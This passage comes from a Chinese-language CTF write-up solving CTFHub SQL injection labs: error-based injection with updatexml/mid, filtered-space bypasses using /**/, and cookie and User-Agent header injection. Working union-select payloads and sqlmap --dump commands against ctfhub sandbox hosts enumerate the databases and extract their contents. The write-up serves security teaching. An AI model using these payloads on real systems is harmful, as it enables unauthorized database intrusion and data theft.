?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_name=<span class="hljs-string">&#x27;flag&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114210012894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(flag) <span class="hljs-keyword">from</span> flag),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205438234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>好像只有一部分flag，这个时候就用到了<code>mid()</code>函数<br><img src="https://img-blog.csdnimg.cn/20201114213929117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用mid函数来进行字符截取,来显示另外一半flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,mid((select group_concat(flag) <span class="hljs-keyword">from</span> flag),<span class="hljs-number">32</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201114205554257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="MySQL结构"><a href="#MySQL结构" class="headerlink" title="MySQL结构"></a>MySQL结构</h2><p><img src="https://img-blog.csdnimg.cn/20210127170719344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.判断注入类型<br>输入1，有回显；输入1 and 1=1，正常回显；输入1 and 1=2,  返回错误。<br><img src="https://img-blog.csdnimg.cn/2021012717113182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以是数字型注入<br>2.判断回显点位<br>输入<code>1 order by 2</code>有回显<br><img src="https://img-blog.csdnimg.cn/20210127171405960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>回显点位为1,2<br><img src="https://img-blog.csdnimg.cn/20210127171713726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.查数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(),<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127171630811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.查表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>有news和nrjduumafr表<br><img src="https://img-blog.csdnimg.cn/2021012717191096.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5.查字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(column_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;nrjduumafr&#x27;</span><br></code></pre></td></tr></table></figure><p>字段名为qejxezuixk<br><img src="https://img-blog.csdnimg.cn/20210127172046307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> qejxezuixk,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> nrjduumafr<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127172202287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>输入1，回显ctfhub；输入2，回显skill；输入3，无回显。<br><img src="https://img-blog.csdnimg.cn/20210127121828345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>绕过空格过滤的方式： <code>/**/、()、%0a</code>。</p><p>用%0a代替空格输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">order</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>有回显<br><img src="https://img-blog.csdnimg.cn/20210127122947660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>判断回显位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127124529352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>database(),<span class="hljs-number">2</span> <br></code></pre></td></tr></table></figure><p> 数据库为sqli<img src="https://img-blog.csdnimg.cn/20210127125025284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查表 ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span> <span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name),<span class="hljs-number">2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <br></code></pre></td></tr></table></figure><p>sqli中有两个表，分别为 rrkdctjwlf和news<br><img src="https://img-blog.csdnimg.cn/20210127125119950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name),<span class="hljs-number">2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rrkdctjwlf&#x27;</span><br></code></pre></td></tr></table></figure><p>rrkdctjwlf表中，有一个字段wonevkchnv<br><img src="https://img-blog.csdnimg.cn/20210127125346665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看字段的数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">Payload: ?id<span class="hljs-operator">=</span> <span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>wonevkchnv,<span class="hljs-number">2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>rrkdctjwlf<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012712590372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p><img src="https://img-blog.csdnimg.cn/20210127144717532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>burpsuite抓包，可以看到Cookie里面有id参数<br><img src="https://img-blog.csdnimg.cn/20210127144902149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.判断注入类型<br><code>id=1 and 1=1</code>有回显<br><img src="https://img-blog.csdnimg.cn/20210127145409657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><code>id=1 and 1=2</code>无回显<br><img src="https://img-blog.csdnimg.cn/20210127145335993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以是数字型注入</p><p>2.判断字段数<br>当<code>id=1 order by 2</code> 时回显正常，当<code>id=1 order by 3</code>时无回显，所以字段数为2<br><img src="https://img-blog.csdnimg.cn/20210127145658543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()<br></code></pre></td></tr></table></figure><p>当前数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127145752840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>有两个表，usrnjffgta和news<br><img src="https://img-blog.csdnimg.cn/20210127145910479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5.爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;usrnjffgta&#x27;</span><br></code></pre></td></tr></table></figure><p>字段名为wbloxpuwcu<br><img src="https://img-blog.csdnimg.cn/20210127150117665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(wbloxpuwcu) <span class="hljs-keyword">from</span> usrnjffgta<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127150238553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>sqlmap–Cookie注入</strong></p><blockquote><p>在sqlmap中使用cookie注入，level &gt;=2才行</p></blockquote><p>首先检测是否有cookie注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; --level 2  </span><br></code></pre></td></tr></table></figure><p>存在Cookie注入<br><img src="https://img-blog.csdnimg.cn/20210127151950563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用kali里面的sqlmap工具<br>1.查库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; --level 2 --dbs   </span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127150746902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2.查表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; -D sqli --tables</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021012715085841.png" alt="在这里插入图片描述"><br>3.查字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; --level 2 -D sqli -T usrnjffgta --columns</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127151427189.png" alt="在这里插入图片描述"><br>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-141d20bd8f71c3ca.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--cookie &quot;id=1&quot; --level 2 -D sqli -T usrnjffgta -C wbloxpuwcu --dump</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127151344509.png" alt="在这里插入图片描述"></p><h2 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h2><p><img src="https://img-blog.csdnimg.cn/20210127152415405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示输入点在User-Agent，使用bp抓包<br><img src="https://img-blog.csdnimg.cn/20210127152708187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.判断注入类型<br>输入1，有回显；输入1 and 1=1，正常回显；输入1 and 1=2,  返回错误。<br><img src="https://img-blog.csdnimg.cn/20210127152937575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注入类型为数字型注入</p><p>2.判断字段数<br>当<code>1 order by 2</code> 时，回显正常，当<code>1 order by 3</code>时，无回显，所以字段数为2<br><img src="https://img-blog.csdnimg.cn/20210127153140753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3.爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()<br></code></pre></td></tr></table></figure><p>当前数据库名为sqli<br><img src="https://img-blog.csdnimg.cn/20210127153316846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4.爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure><p>有两个表， news,llvyiyrndd<br><img src="https://img-blog.csdnimg.cn/20210127153357173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>5.爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;llvyiyrndd&#x27;</span><br></code></pre></td></tr></table></figure><p>字段名为mgrbaiuvpa<br><img src="https://img-blog.csdnimg.cn/20210127153448891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(mgrbaiuvpa) <span class="hljs-keyword">from</span> llvyiyrndd<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127153551534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>sqlmap–UA注入</strong></p><blockquote><p>在sqlmap中lever&gt;=3才会去检查user-agent头是否存在注入漏洞</p></blockquote><p>首先检测是否有UA注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-532573947dea4d7b.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3</span><br><br>sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3</span><br></code></pre></td></tr></table></figure><p>user-agent处存在注入<br><img src="https://img-blog.csdnimg.cn/20210127160432116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>1.爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3  --dbs</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127154207704.png" alt="在这里插入图片描述"><br>2.爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3 -D sqli --tables</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127154647309.png" alt="在这里插入图片描述"><br>3.爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3 -D sqli -T llvyiyrndd --columns</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127155148329.png" alt="在这里插入图片描述"><br>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://challenge-ee766d810401f708.sandbox.ctfhub.com:10080&quot; <span class="hljs-comment">--user-agent &quot;id=1&quot; --level 3 -D sqli -T llvyiyrndd -C mgrbaiuvpa 